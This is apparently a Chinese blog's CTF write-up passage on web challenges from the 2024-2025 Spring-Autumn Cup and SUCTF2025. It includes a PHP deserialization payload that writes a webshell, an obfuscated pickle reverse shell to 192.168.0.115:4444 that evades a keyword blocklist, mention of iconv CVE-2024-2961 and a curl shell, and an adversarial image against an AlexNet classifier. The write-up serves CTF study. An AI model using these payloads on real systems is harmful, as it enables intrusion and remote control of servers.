class="hljs-variable">$book</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>();<br><span class="hljs-variable">$book</span>-&gt;id = <span class="hljs-string">&#x27;kengwang_aura&#x27;</span>;<br><span class="hljs-variable">$book</span>-&gt;title = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$book</span>-&gt;author = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-variable">$partA</span> = <span class="hljs-string">&#x27;&quot;;s:6:&quot;reader&quot;;O:6:&quot;Reader&quot;:1:&#123;s:16:&quot;&#x27;</span>;<br><span class="hljs-variable">$partB</span> = <span class="hljs-string">&#x27;Reader&#x27;</span>;<br><span class="hljs-variable">$partC</span> = <span class="hljs-string">&#x27;location&quot;;s:14:&quot;books/shel.php&quot;;&#125;&#125;;&#x27;</span>;<br><span class="hljs-variable">$payload</span> =  <span class="hljs-variable">$partA</span> . <span class="hljs-string">&quot;\x00&quot;</span> . <span class="hljs-variable">$partB</span> . <span class="hljs-string">&quot;\x00&quot;</span> . <span class="hljs-variable">$partC</span>;<br><span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partA</span>) + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partB</span>) + <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$partC</span>) + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Payload length: &quot;</span> . <span class="hljs-variable">$length</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$book</span>-&gt;summary = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-variable">$length</span>) . <span class="hljs-variable">$payload</span>;<br><span class="hljs-variable">$book</span>-&gt;reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reader</span>(<span class="hljs-string">&#x27;books/&#x27;</span> . <span class="hljs-string">&#x27;abc&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\\&#x27;&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Summary: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$book</span>-&gt;summary);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$book</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n[+] Serialized payload: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$newBook</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+] Location: &quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$newBook</span>-&gt;reader-&gt;<span class="hljs-title function_ invoke__">getLocation</span>();<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119010623597.png" alt="image-20250119010623597"></p><p>可以看到这里调试出的location已经成为了books&#x2F;shel.php，可以任意路径写入了。</p><p>注意这里的 <code>private</code> 其实我们可以不用封装到 <code>\x00</code> 里面的 (7.2+), 为了保险还是这么写了。</p><p>我们访问 <code>update.php</code> 将内容content改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013523131.png" alt="image-20250119013523131"></p><p>但是这里好像没写进去，需要我们再触发一次反序列化，所以在页面写一次：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013602711.png" alt="image-20250119013602711"></p><p>然后就可以上蚁剑了。</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119013655870.png" alt="image-20250119013655870"></p><p>难绷的是给你上了蚁剑插件不能绕的<code>disable_functions</code>，限了open_basedir，虽然这个也可以用mkdir和chdir绕，但是没啥效果其实，因为R不了。</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119014202910.png" alt="image-20250119014202910"></p><p>这里又用了一个怪招，其实我之前也看到过，用iconv那个洞(CVE-2024-2961)去打，这出题人纯缝合b。。。</p><p>这是我在SCTF星盟安全wp里看到的手段，跳板php+iconv。</p><p>按照上面的方法重新添加一本书，再把这个写进去就可以了。</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119015523513.png" alt="image-20250119015523513"></p><p>但是你还是没权限读flag，必须弹个shell提权。</p><p>然而这个抽象环境经常弹不进去shell，用自动挡原本的又会爆稀奇古怪的错，甚至还有把靶机打崩的情况，抽象完了。。。。</p><p>还是用手动挡的吧，把maps和libc导下来，bash也弹不了，curl弹的。估计有点什么编码问题。</p><p>suid提权可见date可用且nopasswd：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250119022246964.png" alt="image-20250119022246964"></p><p>直接读吧：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/34515a72b254ebcddb1772d74b503c4c.png" alt="img"></p><p>打瓦打完复现的，困了，睡觉zzz</p><hr><h2 id="day3-easy-code"><a href="#day3-easy-code" class="headerlink" title="day3-easy_code"></a>day3-easy_code</h2><p>还是放第三天了。</p><p>傻逼绕过题，懒得喷。</p><p>整数溢出直接用</p><p>6.669999999999999…9999e2绕</p><p>伪协议没ban掉iconv-utf类，直接打了：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120132917485.png" alt="image-20250120132917485"></p><p>base64转一下就是flag。</p><h2 id="day3-phar"><a href="#day3-phar" class="headerlink" title="day3-phar"></a>day3-phar</h2><p>叫啥我也忘了，出的原题，烂完了。</p><p>多的不说直接打了：</p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120133105102.png" alt="image-20250120133105102"></p><p><img src="/2025/01/17/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B2024-2025/image-20250120133024084.png" alt="image-20250120133024084"></p><h2 id="day3-ezUpload"><a href="#day3-ezUpload" class="headerlink" title="day3-ezUpload"></a>day3-ezUpload</h2><p>也是个唐题。</p><p>扫描路由后发现存在hint路由，获取到内容VXBMT2FkX2VuY3I3UHQzZA&#x3D;&#x3D;，BASE64解密后得到内容UpLOad_encr7Pt3d，还得猜这个是key，你说是不是唐题。</p><p>还要猜AES-CBC的加密方式，然后fuzz上传猜什么被waf了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;i&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;b&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;o&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;curl&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;system&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27; &#x27;</span> <span class="hljs-keyword">in</span> data:<br></code></pre></td></tr></table></figure><p>最后就是个打pickle。unicode直接就绕了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_data</span>(<span class="hljs-params">data</span>):<br>    key = <span class="hljs-string">b&#x27;UpLOad_encr7Pt3d&#x27;</span><br>    cipher = AES.new(key, AES.MODE_ECB)<br>    padded_data = pad(data, AES.block_size)<br>    encrypted_data = cipher.encrypt(padded_data)<br>    <span class="hljs-keyword">return</span> base64.b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">Vmap</span><br><span class="hljs-string">\x93p0</span><br><span class="hljs-string">0(]V\u0069mp\u006Frt\u0020s\u006Fcket,su\u0062pr\u006Fcess,\u006Fs;s=s\u006Fcket.s\u006Fcket(s\u006Fcket.AF_INET,s\u006Fcket.SOCK_ST\u0052EAM);s.c\u006Fnnect((&quot;192.168.0.115&quot;,4444));\u006Fs.dup2(s.f\u0069len\u006F(),0);\u006Fs.dup2(s.f\u0069len\u006F(),1);\u006Fs.dup2(s.f\u0069len\u006F(),2);p=su\u0062pr\u006Fcess.call([&quot;/\u0062\u0069n/sh&quot;,&quot;-\u0069&quot;]);</span><br><span class="hljs-string">ap1</span><br><span class="hljs-string">0((V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">Vexec</span><br><span class="hljs-string">\x93g1</span><br><span class="hljs-string">tp2</span><br><span class="hljs-string">0(g0</span><br><span class="hljs-string">g2</span><br><span class="hljs-string">\x81tp3</span><br><span class="hljs-string">0V__\u0062u\u0069lt\u0069n__</span><br><span class="hljs-string">V\u0062ytes</span><br><span class="hljs-string">\x93p4</span><br><span class="hljs-string">g3</span><br><span class="hljs-string">\x81.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(encrypt_data(payload))<br></code></pre></td></tr></table></figure><p>放txt里，上传文件解密反弹shell。</p><h2 id="day3-flagBot"><a href="#day3-flagBot" class="headerlink" title="day3-flagBot"></a>day3-flagBot</h2><p>这个不放AI不放misc放web。。。</p><p>思路其实就是它提示的那样</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">通过修改发送的数据包，导致flask报错，得到模型文件名<br>下载模型文件<br>使用得到的模型文件，以及文件名，制作对抗样本<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> torch <span class="hljs-keyword">import</span> nn<br><span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> transforms<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> werkzeug.exceptions<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlexNet</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, num_classes: <span class="hljs-built_in">int</span> = <span class="hljs-number">1000</span>, dropout: <span class="hljs-built_in">float</span> = <span class="hljs-number">0.5</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <span class="hljs-variable language_">self</span>.features = nn.Sequential(<br>            nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>, kernel_size=<span class="hljs-number">11</span>, stride=<span class="hljs-number">4</span>, padding=<span class="hljs-number">2</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">64</span>, <span class="hljs-number">192</span>, kernel_size=<span class="hljs-number">5</span>, padding=<span class="hljs-number">2</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>            nn.Conv2d(<span class="hljs-number">192</span>, <span class="hljs-number">384</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Conv2d(<span class="hljs-number">384</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Conv2d(<span class="hljs-number">256</span>, <span class="hljs-number">256</span>, kernel_size=<span class="hljs-number">3</span>, padding=<span class="hljs-number">1</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.MaxPool2d(kernel_size=<span class="hljs-number">3</span>, stride=<span class="hljs-number">2</span>),<br>        )<br>        <span class="hljs-variable language_">self</span>.avgpool = nn.AdaptiveAvgPool2d((<span class="hljs-number">6</span>, <span class="hljs-number">6</span>))<br>        <span class="hljs-variable language_">self</span>.classifier = nn.Sequential(<br>            nn.Dropout(p=dropout),<br>            nn.Linear(<span class="hljs-number">256</span> * <span class="hljs-number">6</span> * <span class="hljs-number">6</span>, <span class="hljs-number">4096</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Dropout(p=dropout),<br>            nn.Linear(<span class="hljs-number">4096</span>, <span class="hljs-number">4096</span>),<br>            nn.ReLU(inplace=<span class="hljs-literal">True</span>),<br>            nn.Linear(<span class="hljs-number">4096</span>, num_classes),<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x: torch.Tensor</span>) -&gt; torch.Tensor:<br>        x = <span class="hljs-variable language_">self</span>.features(x)<br>        x = <span class="hljs-variable language_">self</span>.avgpool(x)<br>        x = torch.flatten(x, <span class="hljs-number">1</span>)<br>        x = <span class="hljs-variable language_">self</span>.classifier(x)<br>        <span class="hljs-keyword">return</span> x<br><br><br>model = AlexNet(num_classes=<span class="hljs-number">2</span>)<br>model.load_state_dict(torch.load(<span class="hljs-string">&#x27;model_AlexNet.pth&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>), weights_only=<span class="hljs-literal">True</span>))<br>model.<span class="hljs-built_in">eval</span>()<br><br>image = torch.randint(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">300</span>, <span class="hljs-number">600</span>)) / <span class="hljs-number">1.0</span><br>image = torch.cat([image, image, image], dim=<span class="hljs-number">1</span>)<br>criterion = nn.CrossEntropyLoss()<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br>    <br>    image.requires_grad = <span class="hljs-literal">True</span><br>    pred = model(image)<br>    loss = criterion(pred, torch.tensor([<span class="hljs-number">1</span>], dtype=torch.long))<br>    loss.backward()<br>    <span class="hljs-built_in">print</span>(loss.item())<br><br>    image.requires_grad = <span class="hljs-literal">False</span><br>    grad = torch.<span class="hljs-built_in">sum</span>(image.grad, dim=<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">600</span>):<br>            <span class="hljs-keyword">if</span> grad[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, x, y] &gt; <span class="hljs-number">0</span>:<br>                image[<span class="hljs-number">0</span>, :, x, y] = <span class="hljs-number">0.</span><br>            <span class="hljs-keyword">else</span>:<br>                image[<span class="hljs-number">0</span>, :, x, y] = <span class="hljs-number">1.</span><br><br>    transforms.ToPILImage()(image[<span class="hljs-number">0</span>].detach().cpu()).save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后将图片base64编码后发送。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>总之第三天收的题确实烂中烂，还是第二天那个bookshelf算是好题。第一天Gotar也还可以。</p><p>继续看java了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2025-WEB-Learning</title>
    <link href="/2025/01/15/SUCTF2025-WEB-Learning/"/>
    <url>/2025/01/15/SUCTF2025-WEB-Learning/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于考完了，回重庆和高中同学玩了几天。。。</p><p>回家后打了两天游戏，发现一直打也不好玩，就复现复现前几天随便看看的XCTF，很多题感觉还是挺有意思的，就当一种复健了。</p><h2 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h2><p>扫描可以扫到robots.txt和node.md，也就是环境里的字：</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang">书鱼哥哥交给我个任务，让我写一个su的图库来存放战队的美好回忆，我需要测试我开发的代码，于是我在服务器上测试，但是我测试的时候并不想大费周章改变我原本配置的环境。<br><br><span class="hljs-number">1</span>：可以提交一张图片（Working）<br><br><span class="hljs-number">2</span>：通过提交压缩包来批量提交图片<br><br><span class="hljs-number">3</span>...<br></code></pre></td></tr></table></figure><p>随便输url，发现404是php -S临时开启的服务。</p><p>这里打的是<code>PHP&lt;=7.4.21 Development Server源码泄露漏洞</code></p><p><a href="https://cloud.tencent.com/developer/article/2235691">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞-腾讯云开发者社区-腾讯云</a></p><p>前端可以看到unzip.php的文件名，那我们可以通过</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250115200227659.png" alt="image-20250115200227659"></p><p>泄露出<code>unzip.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_extension</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>,<span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$filename</span>;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$filename</span>));<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>                <span class="hljs-comment">// echo &quot;Fail to delete file: $filename\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// echo &quot;This file format is not supported:$extension\n&quot;;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>    <br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// echo &quot;nofile&quot;;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_rename</span> (<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-variable">$randomName</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-number">99999</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-title function_ invoke__">get_extension</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$oldPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>;<br>                <span class="hljs-variable">$newPath</span> = <span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$randomName</span>;<br><br>                <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$oldPath</span>, <span class="hljs-variable">$newPath</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span> . DIRECTORY_SEPARATOR . <span class="hljs-variable">$file</span>);<br>                    <span class="hljs-comment">// echo &quot;Fail to rename file: 